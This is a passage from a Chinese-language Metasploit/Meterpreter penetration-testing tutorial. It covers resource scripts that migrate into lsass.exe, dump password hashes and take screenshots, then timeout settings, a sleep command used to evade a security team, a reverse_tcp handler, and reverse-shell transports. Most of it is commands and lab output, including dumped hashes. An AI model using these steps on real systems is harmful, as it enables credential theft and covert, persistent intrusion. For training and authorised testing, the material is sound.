
```
Architecture : x64
System Language : en_US
Domain : WORKGROUP
Logged On Users : 2
Meterpreter : x64/windows
resource (/root/.msf4/scripts/resource/meterpreter/systeminfo.rc)> getuid
Server username: NT AUTHORITY\SYSTEM
resource (/root/.msf4/scripts/resource/meterpreter/systeminfo.rc)> getpid
Current pid: 5524
resource (/root/.msf4/scripts/resource/meterpreter/systeminfo.rc)> getwd
C:\Windows\system32
meterpreter >
```

4. 虽然有用，但大多数时候，我们希望自动化更重要的任务，因此让我们自动化进程迁移、转储系统哈希，并截取目标桌面的屏幕截图：

```
root@kali:~# cat ~/.msf4/scripts/resource/meterpreter/automate.rc
migrate -N lsass.exe
hashdump
screenshot
root@kali:~#
```

5. 如你所见，这在渗透测试过程中可以证明非常有用：

```
meterpreter > resource automate.rc
[*] Processing /root/.msf4/scripts/resource/meterpreter/automate.rc for ERB directives.
resource (/root/.msf4/scripts/resource/meterpreter/automate.rc)> migrate -N lsass.exe
[*] Migrating from 3636 to 464...
[*] Migration completed successfully.
resource (/root/.msf4/scripts/resource/meterpreter/automate.rc)> hashdump
Administrator:500:aad3b435b51404eea ad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
...snip...
vagrant:1000:aad3b435b51404eea ad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
resource (/root/.msf4/scripts/resource/meterpreter/automate.rc)> screenshot
Screenshot saved to: /root/ThmkKhav.jpeg
meterpreter >
```

6. 除了常规命令之外，Meterpreter 还支持处理 <ruby> 指令，这意味着我们可以在资源脚本中使用 Ruby 的全部功能：

```
cat ~/.msf4/scripts/resource/meterpreter/ruby.rc
<ruby>
$stderr.puts("Ruby is awesome!")
$stderr.puts("session.platform: #{session.platform}, framework: #{framework}")
</ruby>
root@kali:~#
```

7. 在此示例中，我们只是打印会话运行的平台以及框架，但你可以想象所有的可能性：

```
meterpreter > resource ruby.rc
[*] Processing /root/.msf4/scripts/resource/meterpreter/ruby.rc for ERB directives.
[*] resource (/root/.msf4/scripts/resource/meterpreter/ruby.rc)> Ruby Code (112 bytes)
Ruby is awesome!
session.platform: windows, framework:
#<Msf::Framework:0x005555e533c4b8>
meterpreter >
```

## Meterpreter 超时控制

Meterpreter 超时控制允许我们控制 Meterpreter 会话中的超时行为。控制超时允许我们更改噪音水平和其他通信功能，例如 Meterpreter 会话的持续时间。

### 如何操作...

- 1. get_timeouts Meterpreter 命令显示当前的超时配置：

```
meterpreter > get_timeouts
Session Expiry : @ 2017-11-19 05:59:46
Comm Timeout : 300 seconds
Retry Total Time: 3600 seconds
Retry Wait Time : 10 seconds
```

Session Expiry 指定分配给会话的超时期限，之后会话将被终止。如果网络相关问题阻止数据在两个端点之间传输，但不会导致套接字完全断开，则 Comm Timeout 命令允许你指定 Meterpreter 在断开连接或尝试重新连接之前等待通信的时间，默认情况下为 5 分钟。Retry Total Time 是 Meterpreter 尝试通过传输向 Metasploit 重试通信的总时间，默认情况下设置为 3600 秒（1 小时）。Retry Wait Time 指的是在尝试建立连接之前的等待时间。

- 2. 使用 `set_timeouts` 命令，我们可以更改当前的超时配置。要更改 Comm Timeout，可以使用 `-c` 标志后跟秒为单位的时间：

```
meterpreter > set_timeouts -c 600
Session Expiry : @ 2017-11-19 05:59:46
Comm Timeout : 600 seconds
Retry Total Time: 3600 seconds
Retry Wait Time : 10 seconds
```

## Meterpreter 休眠控制

在渗透测试期间，有时需要让 Meterpreter 会话在一段时间内保持安静；例如，如果你认为安全团队已经察觉到你并试图阻止你的攻击。因此，Meterpreter 有一个简单但非常有用的命令叫做 sleep。

### 如何操作...

- 1. sleep 命令正如你所期望的那样工作；它使当前 Meterpreter 会话在指定的时间段内进入休眠，并在时间到期后再次唤醒。因此，让我们让会话休眠 10 秒。在使用 sleep 命令之前，我们需要设置一个 handler，它监听新的 Meterpreter 连接：

```
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
```

```
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > run -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.216.5:4444
msf exploit(handler) >
```

- 2. 现在我们有了监听器，可以使用 sleep 命令后跟我们希望会话休眠的时间段：

```
meterpreter > sleep 10
[*] Telling the target instance to sleep for 10 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] 192.168.216.10 - Meterpreter session 1 closed.
Reason: User exit
msf exploit(handler) >
```

- 3. 10 秒后，我们将获得一个新的 Meterpreter 会话，从而再次访问系统，并且希望不被安全团队察觉：

```
msf exploit(handler) >
[*] Sending stage (205379 bytes) to 192.168.216.10
[*] Meterpreter session 2 opened (192.168.216.5:4444 -> 192.168.216.10:50715) at 2017-11-12 06:43:02 -0500
```

## Meterpreter 传输

transport 命令允许你为当前会话添加新的传输，其中 reverse_tcp 和 reverse_https 是最受欢迎的。Meterpreter 为你提供了其他一些可供选择的传输方式。

### 如何操作...

- 1. 在开始添加新的传输之前，我们将使用带有 `-h` 标志的 `transport` 命令来显示该命令的帮助菜单：

```
meterpreter >
meterpreter > transport -h
Usage: transport <list|change|add|next|prev|remove> [options]

  list: list the currently active transports.
  add: add a new transport to the transport list.
  change: same as add, but changes directly to the added entry.
  next: jump to the next transport in the list (no options).
  prev: jump to the previous transport in the list (no options).
  remove: remove an existing, non-active transport.

OPTIONS:

  -A <opt> User agent for HTTP/S transports (optional)
  -B <opt> Proxy type for HTTP/S transports (optional: http, socks; default: http)
  -C <opt> Comms timeout (seconds) (default: same as current session)
  -H <opt> Proxy host for HTTP/S transports (optional)
  -N <opt> Proxy password for HTTP/S transports (optional)
  -P <opt> Proxy port for HTTP/S transports (optional)
  -T <opt> Retry total time (seconds) (default: same as current session)
  -U <opt> Proxy username for HTTP/S transports (optional)
  -W <opt> Retry wait time (seconds) (default: same as current session)
  -X <opt> Expiration timeout (seconds) (default: same as current session)
  -c <opt> SSL certificate path for https transport verification (optional)
  -h      Help menu
  -i <opt> Specify transport by index (currently supported: remove)
  -l <opt> LHOST parameter (for reverse transports)
  -p <opt> LPORT parameter
  -t <opt> Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp
  -u <opt> Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI)
  -v      Show the verbose format of the transport list

meterpreter >
```

- 2. 要列出当前活动的传输，我们可以使用带有 `list` 选项的 `transport` 命令：

```
meterpreter > transport list
Session Expiry : @ 2017-11-23 16:11:07
```

| ID | 当前 | URL | 通讯超时 | 重试总计 | 重试等待 |
|----|------|-----|-----------|-------------|------------|
| 1 | * | tcp://192.168.216.5:4444 | 300 | 3600 | 10 |
